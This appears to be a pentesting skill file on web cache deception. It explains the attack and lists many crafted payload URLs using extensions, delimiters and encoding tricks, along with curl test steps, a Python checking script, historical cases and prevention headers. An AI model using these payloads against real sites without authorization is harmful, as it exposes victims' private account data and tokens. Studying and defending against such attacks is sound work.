---
name: web-cache
description: Web cache deception and poisoning attacks. Use when testing CDN/cache behavior.
---

# Web Cache Deception

## Description
Web Cache Deception (WCD) tricks caching servers into storing sensitive, user-specific content by appending static file extensions to dynamic URLs. When the cache serves this content to other users, it can lead to information disclosure and account takeover.

## How It Works

1. Attacker crafts URL: `https://target.com/account/settings/nonexistent.css`
2. Victim visits the crafted URL (via phishing link)
3. Origin server ignores the fake path and serves `/account/settings`
4. Cache server sees `.css` extension and caches the response
5. Attacker requests the same URL
6. Cache serves victim's sensitive data to attacker

## Vulnerability Requirements

1. **Origin server** must ignore trailing path components
2. **Cache server** must cache based on file extension
3. **No Cache-Control headers** preventing caching
4. **Different path interpretation** between origin and cache

## Exploitation Techniques

### Basic Path Confusion

```
# Add static extension
https://target.com/account.css
https://target.com/account.js
https://target.com/account.jpg
https://target.com/account.png
https://target.com/account.svg
https://target.com/account.woff
https://target.com/account.ico

# Add path with extension
https://target.com/account/anything.css
https://target.com/account/x.js
https://target.com/settings/profile.png
```

### Delimiter-Based Attacks

```
# Semicolon (works on some servers)
https://target.com/account;nonexistent.css

# Encoded characters
https://target.com/account%2Fnonexistent.css
https://target.com/account%3Bnonexistent.css

# Other delimiters
https://target.com/account#nonexistent.css
https://target.com/account?cachebuster.css
```

### Path Normalization Confusion

```
# Dot segments
https://target.com/account/./nonexistent.css
https://target.com/account/../account/x.css

# Encoded slashes
https://target.com/account%2f.css
https://target.com/account%5c.css

# Double encoding
https://target.com/account%252f.css
```

### Cache Key Manipulation

```
# Query parameters may be ignored by cache
https://target.com/account?cb=random.css
https://target.com/account?file=style.css

# Fragment identifiers
https://target.com/account#.css
```

## Static Extensions to Try

```
# Stylesheets
.css

# JavaScript
.js

# Images
.jpg
.jpeg
.png
.gif
.ico
.svg
.webp
.bmp

# Fonts
.woff
.woff2
.ttf
.eot

# Other static
.txt
.xml
.json (sometimes cached)
.pdf
.swf (legacy)
```

## Detection

### Check Cache Headers
```bash
# Look for cache indicators
curl -I "https://target.com/account/x.css"

# Headers to check:
# X-Cache: HIT
# CF-Cache-Status: HIT
# Age: <non-zero>
# X-Cache-Status: HIT
# X-Proxy-Cache: HIT
```

### Testing Methodology
```bash
# 1. Login and access sensitive page
curl -c cookies.txt "https://target.com/login" -d "user=test&pass=test"

# 2. Access sensitive page normally
curl -b cookies.txt "https://target.com/account"
# Note the response content

# 3. Access with static extension
curl -b cookies.txt "https://target.com/account/x.css"

# 4. Check if cached (without auth)
curl "https://target.com/account/x.css"
# If same content returned - vulnerable!
```

## Tools

### param-miner (Burp Extension)
```
1. Install from BApp Store
2. Right-click request
3. Extensions > Param Miner > Guess headers
4. Check for cache poisoning vectors
```

### Manual Testing Script
```python
import requests

target = "https://target.com/account"
extensions = ['.css', '.js', '.png', '.jpg', '.ico', '.svg']

for ext in extensions:
    url = f"{target}/cachebuster{ext}"

    # Request with auth
    auth_response = requests.get(url, cookies={'session': 'victim_session'})

    # Request without auth
    unauth_response = requests.get(url)

    if 'sensitive_data' in unauth_response.text:
        print(f"[VULNERABLE] {url}")
```

## Real-World Examples

### PayPal (2017)
```
# Sensitive URL
https://www.paypal.com/myaccount/home

# Exploited URL
https://www.paypal.com/myaccount/home/malicious.css

# Cached victim's account page
```

### OpenAI (2023)
```
# OAuth endpoint vulnerable
https://auth.openai.com/authorize?...&response_type=code/cache.css

# Cached authorization tokens
```

## Cache Deception vs Cache Poisoning

| Web Cache Deception | Web Cache Poisoning |
|---------------------|---------------------|
| Stores victim's data | Stores attacker's payload |
| Targets specific users | Targets all users |
| Reads sensitive data | Injects malicious content |
| Victim visits attacker's URL | Attacker poisons normal URL |

## Prevention

### Origin Server
```
# Strict URL routing
# Don't serve dynamic content for non-existent paths
# Return 404 for unknown extensions
```

### Cache Configuration
```
# Only cache explicitly allowed paths
# Don't cache based on extension alone
# Respect Cache-Control headers
```

### Headers
```http
# Prevent caching of sensitive pages
Cache-Control: no-store, no-cache, private
Vary: Cookie
```

### CloudFlare Cache Deception Armor
```
# Enable in CloudFlare dashboard
# Verifies file extension matches content type
```

## Testing Checklist

- [ ] Identify cacheable static extensions
- [ ] Test path appending with extensions
- [ ] Test delimiter-based paths
- [ ] Check cache headers in responses
- [ ] Test with authenticated session
- [ ] Verify cached content accessible without auth
- [ ] Test different path normalization tricks
- [ ] Document cached sensitive data

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception
- https://portswigger.net/web-security/web-cache-deception
- https://www.omer.ninja/blog/web-cache-deception/
